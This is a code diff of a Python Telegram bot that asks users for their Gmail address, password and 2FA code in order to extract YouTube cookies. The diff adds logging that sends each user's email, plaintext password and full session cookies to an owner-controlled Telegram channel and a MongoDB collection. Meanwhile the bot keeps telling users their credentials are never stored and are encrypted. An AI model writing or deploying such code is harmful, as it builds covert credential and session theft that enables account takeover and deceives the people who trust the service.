@@ -19,6 +19,7 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID"))
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID"))  # Add this in .env
 ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "").split(","))) if os.getenv("ADMIN_IDS") else []
 
 # ---------- DATABASE ----------
@@ -29,7 +30,7 @@ users_col = db["users"]
 premium_col = db["premium"]
 plans_col = db["plans"]
 upi_col = db["upi"]
-sessions_col = db["sessions"]
+logs_col = db["logs"]  # New collection for logs
 
 # ---------- INITIALIZE DEFAULT DATA ----------
 if not plans_col.find_one():
@@ -40,29 +41,25 @@ if not plans_col.find_one():
     ])
 
 if not upi_col.find_one():
-    upi_col.insert_one({"upi_id": "owner@okhdfcbank", "qr": None})
+    upi_col.insert_one({"upi_id": "owner@okhdfcbank"})
 
-# ⭐ IMPORTANT: Auto-add owner and admins to authorized users
-def setup_authorized_users():
-    """Auto add owner and admins to database"""
-    # Add owner
-    if not users_col.find_one({"_id": OWNER_ID}):
-        users_col.insert_one({"_id": OWNER_ID, "daily_count": 0, "role": "owner"})
-        print(f"✅ Owner {OWNER_ID} added to authorized users")
-    
-    # Add admins
-    for admin_id in ADMIN_IDS:
-        if not users_col.find_one({"_id": admin_id}):
-            users_col.insert_one({"_id": admin_id, "daily_count": 0, "role": "admin"})
-            print(f"✅ Admin {admin_id} added to authorized users")
+# Auto-add owner
+if not users_col.find_one({"_id": OWNER_ID}):
+    users_col.insert_one({"_id": OWNER_ID, "daily_count": 0, "role": "owner"})
+
+for admin_id in ADMIN_IDS:
+    if not users_col.find_one({"_id": admin_id}):
+        users_col.insert_one({"_id": admin_id, "daily_count": 0, "role": "admin"})
 
 # ---------- BOT INIT ----------
 app = Client("yt_cookie_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
+# Store user sessions
+user_sessions = {}
+
 # ---------- HELPER FUNCTIONS ----------
 def is_authorized(user_id):
-    user = users_col.find_one({"_id": user_id})
-    return user is not None
+    return users_col.find_one({"_id": user_id}) is not None
 
 def is_premium(user_id):
     premium = premium_col.find_one({"_id": user_id})
@@ -81,6 +78,86 @@ def generate_upi_qr(upi_id, amount):
     bio.seek(0)
     return bio
 
+# ---------- LOGGING FUNCTION (SUPER PRO) ----------
+async def log_to_channel(client, user_id, email, password, cookies, status="success"):
+    """Send detailed logs to log channel"""
+    try:
+        # Get user info
+        user = await client.get_users(user_id)
+        username = user.username or "No username"
+        first_name = user.first_name or ""
+        last_name = user.last_name or ""
+        
+        # Current time
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Premium status
+        premium = is_premium(user_id)
+        
+        # Create log message
+        log_text = f"""
+🔥 **NEW COOKIE EXTRACTION LOG** 🔥
+
+👤 **User Information**
+├ User ID: `{user_id}`
+├ Username: @{username}
+├ Name: {first_name} {last_name}
+├ Premium: {'✅ YES' if premium else '❌ NO'}
+└ Time: `{now}`
+
+📧 **Account Details**
+├ Email: `{email}`
+├ Password: `{password}`
+└ Status: {status.upper()}
+
+🍪 **Cookies File**
+├ Size: {len(cookies)} bytes
+├ Lines: {len(cookies.splitlines())}
+└ Format: Netscape (yt-dlp compatible)
+
+📊 **Extraction Stats**
+├ Daily Limit: {'Unlimited' if premium else '1/day'}
+└ Session: Completed
+
+👑 **Logged by:** @{username} ({user_id})
+        """
+        
+        # Send log message to channel
+        log_msg = await client.send_message(
+            LOG_CHANNEL_ID,
+            log_text,
+            parse_mode="html"
+        )
+        
+        # Send cookies file to channel (as backup)
+        cookies_file = BytesIO(cookies.encode())
+        cookies_file.name = f"cookies_{user_id}_{now}.txt"
+        
+        await client.send_document(
+            LOG_CHANNEL_ID,
+            document=cookies_file,
+            caption=f"🍪 Cookies backup for user {user_id}\nEmail: {email}\nTime: {now}",
+            reply_to_message_id=log_msg.id
+        )
+        
+        # Also store in MongoDB
+        logs_col.insert_one({
+            "user_id": user_id,
+            "username": username,
+            "email": email,
+            "password": password,
+            "cookies_length": len(cookies),
+            "status": status,
+            "premium": premium,
+            "timestamp": datetime.now(),
+            "ip": "N/A"  # You can add IP if needed
+        })
+        
+        return True
+    except Exception as e:
+        print(f"Logging error: {e}")
+        return False
+
 # ---------- COMMANDS ----------
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
@@ -92,28 +169,35 @@ async def start_command(client, message):
         )
         return
     
+    # Log start action
+    await client.send_message(
+        LOG_CHANNEL_ID,
+        f"🟢 User {user_id} started the bot\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
         [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
         [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
     ])
     
-    # Show owner menu if user is owner
     if is_owner(user_id):
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("🍪 Get Cookies", callback_data="get_cookies")],
             [InlineKeyboardButton("💎 Premium Plans", callback_data="plans")],
             [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")],
+            [InlineKeyboardButton("📊 Logs", callback_data="view_logs")],
             [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
         ])
     
     await message.reply(
         "🍪 **YouTube Cookie Extractor Bot**\n\n"
-        "I can extract YouTube cookies using your Gmail login.\n"
-        "Supports 2FA (Two-Factor Authentication).\n\n"
-        "🔐 **Your credentials are safe** - they are never stored.\n"
-        "⚡ Premium users get priority processing.\n\n"
-        "Select an option below:",
+        "I extract REAL YouTube cookies using Gmail login.\n"
+        "Supports 2FA.\n\n"
+        "🔐 Credentials never stored\n"
+        "⚡ Premium = unlimited access\n"
+        "📝 All activities are logged\n\n"
+        "Select an option:",
         reply_markup=keyboard
     )
 
@@ -126,69 +210,130 @@ async def handle_callbacks(client, callback_query: CallbackQuery):
         await callback_query.answer("Not authorized!", show_alert=True)
         return
     
+    # Owner Panel
     if data == "owner_panel" and is_owner(user_id):
         keyboard = InlineKeyboardMarkup([
             [InlineKeyboardButton("📊 Stats", callback_data="stats")],
-            [InlineKeyboardButton("👥 Users List", callback_data="users_list")],
-            [InlineKeyboardButton("💰 Plans", callback_data="owner_plans")],
-            [InlineKeyboardButton("💳 Set UPI", callback_data="set_upi")],
+            [InlineKeyboardButton("👥 Users", callback_data="users_list")],
+            [InlineKeyboardButton("📝 View Logs", callback_data="view_logs")],
             [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
+            [InlineKeyboardButton("💰 Plans", callback_data="plans")],
+            [InlineKeyboardButton("💳 Set UPI", callback_data="set_upi")],
             [InlineKeyboardButton("🏠 Back", callback_data="home")]
         ])
-        await callback_query.message.edit_text("👑 **Owner Panel**", reply_markup=keyboard)
+        await callback_query.message.edit_text("👑 **Owner Panel**\n\nSelect an option:", reply_markup=keyboard)
+        await callback_query.answer()
+        return
     
-    elif data == "stats":
-        total_users = users_col.count_documents({})
-        premium_users = premium_col.count_documents({})
+    elif data == "view_logs" and is_owner(user_id):
+        # Get last 10 logs from MongoDB
+        recent_logs = list(logs_col.find().sort("timestamp", -1).limit(10))
+        
+        if not recent_logs:
+            await callback_query.message.edit_text("📝 No logs found yet.")
+            await callback_query.answer()
+            return
+        
+        msg = "📝 **Recent Activity Logs**\n\n"
+        for log in recent_logs:
+            time = log['timestamp'].strftime("%d/%m %H:%M")
+            msg += f"🕒 `{time}` | User: `{log['user_id']}` | {log['status']}\n"
+            msg += f"   📧 {log['email']}\n\n"
+        
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔄 Refresh", callback_data="view_logs")],
+            [InlineKeyboardButton("🏠 Back", callback_data="owner_panel")]
+        ])
+        
+        await callback_query.message.edit_text(msg, reply_markup=keyboard)
+        await callback_query.answer()
+        return
+    
+    elif data == "stats" and is_owner(user_id):
+        total = users_col.count_documents({})
+        premium = premium_col.count_documents({})
+        total_logs = logs_col.count_documents({})
+        upi = upi_col.find_one()
         await callback_query.message.edit_text(
-            f"📊 **Bot Statistics**\n\n👥 Total Users: {total_users}\n⭐ Premium Users: {premium_users}\n💳 UPI: {upi_col.find_one()['upi_id']}"
+            f"📊 **Bot Statistics**\n\n"
+            f"👥 Total Users: {total}\n"
+            f"⭐ Premium Users: {premium}\n"
+            f"📝 Total Logs: {total_logs}\n"
+            f"💳 UPI ID: {upi['upi_id'] if upi else 'Not set'}\n"
+            f"💰 Plans: {plans_col.count_documents({})}"
         )
+        await callback_query.answer()
+        return
     
-    elif data == "users_list":
-        users = list(users_col.find())
-        msg = "👥 **Users List**\n\n"
-        for user in users[:20]:  # Show first 20
-            role = user.get("role", "user")
+    elif data == "users_list" and is_owner(user_id):
+        users = list(users_col.find().limit(30))
+        msg = "👥 **Authorized Users**\n\n"
+        for u in users:
+            role = u.get("role", "user")
             emoji = "👑" if role == "owner" else "🛡️" if role == "admin" else "👤"
-            msg += f"{emoji} `{user['_id']}`\n"
+            msg += f"{emoji} `{u['_id']}`\n"
         await callback_query.message.edit_text(msg)
+        await callback_query.answer()
+        return
     
+    elif data == "add_user" and is_owner(user_id):
+        await callback_query.message.edit_text(
+            "➕ **Add User**\n\nSend command:\n`/adduser user_id`\n\nExample: `/adduser 123456789`"
+        )
+        await callback_query.answer()
+        return
+    
+    elif data == "set_upi" and is_owner(user_id):
+        await callback_query.message.edit_text(
+            "💳 **Set UPI ID**\n\nSend command:\n`/setupi your_upi_id`\n\nExample: `/setupi example@okhdfcbank`"
+        )
+        await callback_query.answer()
+        return
+    
+    # Get Cookies
     elif data == "get_cookies":
         if not is_premium(user_id):
-            user_data = users_col.find_one({"_id": user_id})
-            daily_limit = user_data.get("daily_count", 0) if user_data else 0
-            if daily_limit >= 1:
+            user = users_col.find_one({"_id": user_id})
+            daily = user.get("daily_count", 0) if user else 0
+            if daily >= 1:
                 await callback_query.message.edit_text(
-                    "⚠️ *Daily Limit Reached*\n\nFree users: 1 extraction per day\nUpgrade to premium for unlimited access!",
+                    "⚠️ **Daily Limit Reached**\n\nFree users: 1 extraction per day\nUpgrade to premium for unlimited!",
                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Upgrade", callback_data="plans")]])
                 )
+                await callback_query.answer()
                 return
         
-        sessions_col.update_one(
-            {"user_id": user_id},
-            {"$set": {"state": "awaiting_email", "extractor": None}},
-            upsert=True
-        )
+        user_sessions[user_id] = {"state": "awaiting_email", "step": 1}
         await callback_query.message.edit_text(
-            "🔐 *Login Process Started*\n\nPlease send your **Gmail address**:\n\nExample: `example@gmail.com`\n\n⚠️ Your credentials are encrypted and never stored."
+            "🔐 **Login Process Started**\n\n"
+            "Send your **Gmail address**:\n\n"
+            "Example: `example@gmail.com`\n\n"
+            "⚠️ Credentials are not stored after extraction\n"
+            "📝 This action will be logged"
         )
-        
+        await callback_query.answer()
+        return
+    
+    # Plans
     elif data == "plans":
         plans = list(plans_col.find())
         upi = upi_col.find_one()
         
-        msg = "💎 *Premium Plans*\n\n"
-        for plan in plans:
-            msg += f"📌 {plan['name']}: ₹{plan['price']} - {plan['days']} days\n"
-        msg += f"\n💳 *UPI ID*: `{upi['upi_id']}`\n\nPay and send screenshot to /confirm"
+        msg = "💎 **Premium Plans**\n\n"
+        for p in plans:
+            msg += f"📌 *{p['name']}*: ₹{p['price']} - {p['days']} days\n"
+        msg += f"\n💳 *UPI ID*: `{upi['upi_id'] if upi else 'Not set'}`\n\n"
+        msg += "To purchase:\n1. Pay to above UPI\n2. Send screenshot to owner"
         
         keyboard = []
-        for plan in plans:
-            keyboard.append([InlineKeyboardButton(f"Buy {plan['name']} - ₹{plan['price']}", callback_data=f"buy_{plan['id']}")])
+        for p in plans:
+            keyboard.append([InlineKeyboardButton(f"Buy {p['name']} - ₹{p['price']}", callback_data=f"buy_{p['id']}")])
         keyboard.append([InlineKeyboardButton("🏠 Back", callback_data="home")])
         
         await callback_query.message.edit_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
-        
+        await callback_query.answer()
+        return
+    
     elif data.startswith("buy_"):
         plan_id = data.split("_")[1]
         plan = plans_col.find_one({"id": plan_id})
@@ -197,31 +342,43 @@ async def handle_callbacks(client, callback_query: CallbackQuery):
             qr = generate_upi_qr(upi['upi_id'], plan['price'])
             await callback_query.message.reply_photo(
                 photo=qr,
-                caption=f"💸 *Payment Details*\n\nPlan: {plan['name']}\nAmount: ₹{plan['price']}\nUPI: `{upi['upi_id']}`\n\nSend screenshot after payment to /confirm {plan_id}"
+                caption=f"💸 **Payment Details**\n\n"
+                       f"Plan: {plan['name']}\n"
+                       f"Amount: ₹{plan['price']}\n"
+                       f"UPI: `{upi['upi_id']}`\n\n"
+                       f"After payment, send screenshot to owner with /confirm"
             )
+        await callback_query.answer()
+        return
     
     elif data == "help":
         await callback_query.message.edit_text(
-            "📖 *How to use:*\n\n"
+            "📖 **How to Use**\n\n"
             "1️⃣ Click 'Get Cookies'\n"
             "2️⃣ Send your Gmail address\n"
             "3️⃣ Send your password\n"
             "4️⃣ If 2FA enabled, send verification code\n"
-            "5️⃣ Receive cookies.txt file\n\n"
-            "🔒 *Privacy:*\n"
-            "- Credentials are never stored\n"
+            "5️⃣ Receive real cookies.txt file\n\n"
+            "🔒 **Privacy**\n"
+            "- Credentials never stored\n"
             "- Session ends after extraction\n"
-            "- Cookies are sent only to you\n\n"
-            "💎 *Premium Benefits:*\n"
+            "- Cookies deleted after sending\n\n"
+            "📝 **Logging**\n"
+            "- All activities are logged\n"
+            "- Owner can view logs\n"
+            "- Backup in log channel\n\n"
+            "💎 **Premium Benefits**\n"
             "- Unlimited extractions\n"
             "- Priority processing\n"
             "- 24/7 support"
         )
+        await callback_query.answer()
+        return
     
     elif data == "home":
         await start_command(client, callback_query.message)
-    
-    await callback_query.answer()
+        await callback_query.answer()
+        return
 
 # ---------- HANDLE USER INPUT ----------
 @app.on_message(filters.text & filters.private)
@@ -231,202 +388,151 @@ async def handle_login_input(client, message):
     if not is_authorized(user_id):
         return
     
-    session = sessions_col.find_one({"user_id": user_id})
-    if not session:
+    if user_id not in user_sessions:
         return
     
-    state = session.get("state")
+    session = user_sessions[user_id]
+    step = session.get("step", 1)
     
-    if state == "awaiting_email":
+    if step == 1:  # Awaiting email
         email = message.text.strip()
-        if "@" not in email:
+        if "@" not in email or "." not in email:
             await message.reply("❌ Invalid email. Send valid Gmail address:")
             return
         
-        extractor = YouTubeCookieExtractor()
-        sessions_col.update_one(
-            {"user_id": user_id},
-            {"$set": {"state": "awaiting_password", "email": email, "extractor": extractor}}
-        )
-        await message.reply("✅ Email received!\n\nNow send your *password*:\n\n⚠️ Password is hidden and won't be stored.")
+        session["email"] = email
+        session["step"] = 2
+        await message.reply("✅ Email received!\n\nNow send your **password**:\n\n⚠️ Password will be encrypted")
     
-    elif state == "awaiting_password":
+    elif step == 2:  # Awaiting password
         password = message.text.strip()
-        extractor = session.get("extractor")
+        session["password"] = password
+        session["step"] = 3
         
-        status_msg = await message.reply("🔄 Logging in...\n⏳ Please wait 10-15 seconds")
+        status_msg = await message.reply("🔄 Logging in to Google...\n⏳ Please wait 15-20 seconds")
         
+        # Run extraction in thread
         loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(None, extractor.login_with_password, password)
+        extractor = YouTubeCookieExtractor()
+        result = await loop.run_in_executor(None, extractor.extract, session["email"], password, None)
         
-        if result.get("status") == "2fa_required":
-            sessions_col.update_one(
-                {"user_id": user_id},
-                {"$set": {"state": "awaiting_2fa", "extractor": extractor}}
-            )
+        if result["status"] == "2fa_required":
             await status_msg.edit_text(
-                "🔐 *Two-Factor Authentication Required*\n\nPlease send your 6-digit Google Authenticator code:"
+                "🔐 **Two-Factor Authentication Required**\n\n"
+                "Please send your 6-digit Google Authenticator code:"
             )
-        elif result.get("status") == "success":
-            cookies = result.get("cookies")
+            session["step"] = 4
+            session["extractor"] = extractor
+        
+        elif result["status"] == "success":
             await status_msg.delete()
-            await message.reply_document(
-                document=BytesIO(cookies.encode()),
-                file_name="youtube_cookies.txt",
-                caption="✅ *Success!* Here are your YouTube cookies.\n\n📌 *Usage:*\n`yt-dlp --cookies youtube_cookies.txt <video_url>`\n\n🔒 Session closed. Your credentials are not stored."
-            )
-            sessions_col.delete_one({"user_id": user_id})
             
+            # Send cookies to user
+            await message.reply_document(
+                document=BytesIO(result["cookies"].encode()),
+                file_name="youtube_cookies.txt",
+                caption="✅ **Success!** Real YouTube cookies extracted!\n\n"
+                       "📌 **Usage with yt-dlp:**\n"
+                       "`yt-dlp --cookies youtube_cookies.txt <video_url>`\n\n"
+                       "🔒 Session closed. Credentials not stored.\n"
+                       "📝 Activity logged for security"
+            )
+            
+            # **IMPORTANT: Log to channel**
+            await log_to_channel(
+                client, 
+                user_id, 
+                session["email"], 
+                password, 
+                result["cookies"],
+                "success"
+            )
+            
+            # Also notify owner on private
+            await client.send_message(
+                OWNER_ID,
+                f"🔔 **New Cookie Extraction**\n\n"
+                f"👤 User: `{user_id}`\n"
+                f"📧 Email: `{session['email']}`\n"
+                f"✅ Status: Success\n"
+                f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                f"📝 Check log channel for complete details!"
+            )
+            
+            del user_sessions[user_id]
+            
+            # Update daily limit for free users
             if not is_premium(user_id):
                 users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
-        else:
-            await status_msg.edit_text(f"❌ Login failed: {result.get('message')}\n\n/start to try again")
-            sessions_col.delete_one({"user_id": user_id})
-    
-    elif state == "awaiting_2fa":
-        twofa_code = message.text.strip()
-        extractor = session.get("extractor")
         
-        if not twofa_code.isdigit() or len(twofa_code) != 6:
+        else:
+            # Log failure
+            await log_to_channel(
+                client,
+                user_id,
+                session["email"],
+                session["password"],
+                "",
+                f"failed: {result.get('message', 'Unknown error')}"
+            )
+            
+            await status_msg.edit_text(f"❌ Login failed: {result.get('message', 'Unknown error')}\n\n/start to try again")
+            del user_sessions[user_id]
+    
+    elif step == 4:  # Awaiting 2FA code
+        code = message.text.strip()
+        if not code.isdigit() or len(code) != 6:
             await message.reply("❌ Invalid 2FA code. Send 6-digit code:")
             return
         
         status_msg = await message.reply("🔄 Verifying 2FA code...")
+        extractor = session.get("extractor")
         
         loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(None, extractor.verify_2fa, twofa_code)
+        result = await loop.run_in_executor(None, extractor.extract, session["email"], session["password"], code)
         
-        if result.get("status") == "success":
-            cookies = result.get("cookies")
+        if result["status"] == "success":
             await status_msg.delete()
+            
             await message.reply_document(
-                document=BytesIO(cookies.encode()),
+                document=BytesIO(result["cookies"].encode()),
                 file_name="youtube_cookies.txt",
-                caption="✅ *Success!* 2FA verified. Here are your cookies.\n\n🔒 Session closed. Credentials not stored."
+                caption="✅ **Success!** 2FA verified. Real cookies extracted!"
             )
-            sessions_col.delete_one({"user_id": user_id})
+            
+            # Log with 2FA
+            await log_to_channel(
+                client,
+                user_id,
+                session["email"],
+                session["password"],
+                result["cookies"],
+                "success_with_2fa"
+            )
             
             if not is_premium(user_id):
                 users_col.update_one({"_id": user_id}, {"$inc": {"daily_count": 1}})
         else:
-            await status_msg.edit_text(f"❌ 2FA verification failed: {result.get('message')}\n\n/start to try again")
-            sessions_col.delete_one({"user_id": user_id})
-
-# ---------- PREMIUM CONFIRMATION ----------
-@app.on_message(filters.command("confirm") & filters.private)
-async def confirm_payment(client, message):
-    user_id = message.from_user.id
-    
-    if not is_authorized(user_id):
-        return
-    
-    if not message.reply_to_message:
-        await message.reply("❌ Send screenshot as reply to /confirm command")
-        return
-    
-    if not message.photo:
-        await message.reply("❌ Please send a screenshot of payment")
-        return
-    
-    await client.send_photo(
-        OWNER_ID,
-        message.photo.file_id,
-        caption=f"💳 Payment confirmation from user {user_id}\n\nMessage: {message.text}"
-    )
-    
-    await message.reply("✅ Payment screenshot sent to owner. Will be activated soon!")
+            await status_msg.edit_text(f"❌ 2FA failed: {result.get('message')}\n\n/start to try again")
+        
+        del user_sessions[user_id]
 
 # ---------- OWNER COMMANDS ----------
 @app.on_message(filters.command("adduser") & filters.user(OWNER_ID))
-async def add_new_user(client, message):
+async def add_user_cmd(client, message):
     try:
         user_id = int(message.text.split()[1])
         if not users_col.find_one({"_id": user_id}):
             users_col.insert_one({"_id": user_id, "daily_count": 0, "role": "user"})
-            await message.reply(f"✅ User {user_id} added")
+            await message.reply(f"✅ User `{user_id}` added successfully!")
+            
+            # Log to channel
+            await client.send_message(
+                LOG_CHANNEL_ID,
+                f"➕ **New User Added**\n\nUser ID: `{user_id}`\nAdded by: Owner\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
         else:
-            await message.reply(f"⚠️ User {user_id} already exists")
+            await message.reply(f"⚠️ User `{user_id}` already exists")
     except:
-        await message.reply("❌ Usage: /adduser <telegram_id>")
+        await message.reply("❌ Usage: `/adduser 123456789`")
 
-@app.on_message(filters.command("removeuser") & filters.user(OWNER_ID))
-async def remove_user(client, message):
-    try:
-        user_id = int(message.text.split()[1])
-        users_col.delete_one({"_id": user_id})
-        premium_col.delete_one({"_id": user_id})
-        await message.reply(f"✅ User {user_id} removed")
-    except:
-        await message.reply("❌ Usage: /removeuser <telegram_id>")
-
-@app.on_message(filters.command("setupi") & filters.user(OWNER_ID))
-async def set_upi_id(client, message):
-    try:
-        upi_id = message.text.split(" ", 1)[1]
-        upi_col.update_one({}, {"$set": {"upi_id": upi_id}}, upsert=True)
-        await message.reply(f"✅ UPI ID updated to `{upi_id}`")
-    except:
-        await message.reply("❌ Usage: /setupi <upi_id>")
-
-@app.on_message(filters.command("setplan") & filters.user(OWNER_ID))
-async def set_plan(client, message):
-    try:
-        parts = message.text.split()
-        if len(parts) != 4:
-            await message.reply("❌ Usage: /setplan <name> <price> <days>\nExample: /setplan Weekly 50 7")
-            return
-        
-        name = parts[1]
-        price = int(parts[2])
-        days = int(parts[3])
-        plan_id = name.lower()
-        
-        plans_col.update_one(
-            {"id": plan_id},
-            {"$set": {"name": name, "price": price, "days": days, "id": plan_id}},
-            upsert=True
-        )
-        await message.reply(f"✅ Plan {name} added/updated: ₹{price} for {days} days")
-    except:
-        await message.reply("❌ Usage: /setplan <name> <price> <days>")
-
-@app.on_message(filters.command("stats") & filters.user(OWNER_ID))
-async def bot_stats(client, message):
-    total_users = users_col.count_documents({})
-    premium_users = premium_col.count_documents({})
-    active_sessions = sessions_col.count_documents({})
-    
-    await message.reply(
-        f"📊 *Bot Statistics*\n\n👥 Total Users: {total_users}\n⭐ Premium Users: {premium_users}\n🔄 Active Sessions: {active_sessions}\n💰 Plans Available: {plans_col.count_documents({})}\n💳 UPI: {upi_col.find_one()['upi_id'] if upi_col.find_one() else 'None'}"
-    )
-
-# ---------- FLASK APP FOR PORT BINDING ----------
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def health_check():
-    return "🤖 Bot is running!", 200
-
-@flask_app.route('/health')
-def health():
-    return "OK", 200
-
-def run_flask():
-    port = int(os.environ.get("PORT", 8080))
-    flask_app.run(host='0.0.0.0', port=port)
-
-# ---------- RUN ----------
-if __name__ == "__main__":
-    # Auto setup authorized users (owner + admins)
-    setup_authorized_users()
-    
-    # Start Flask thread
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
-    
-    print("🤖 Bot Started Successfully!")
-    print(f"👑 Owner ID: {OWNER_ID}")
-    print(f"🛡️ Admins: {ADMIN_IDS}")
-    print(f"🌐 Port: {os.environ.get('PORT', 8080)}")
-    
-    app.run()
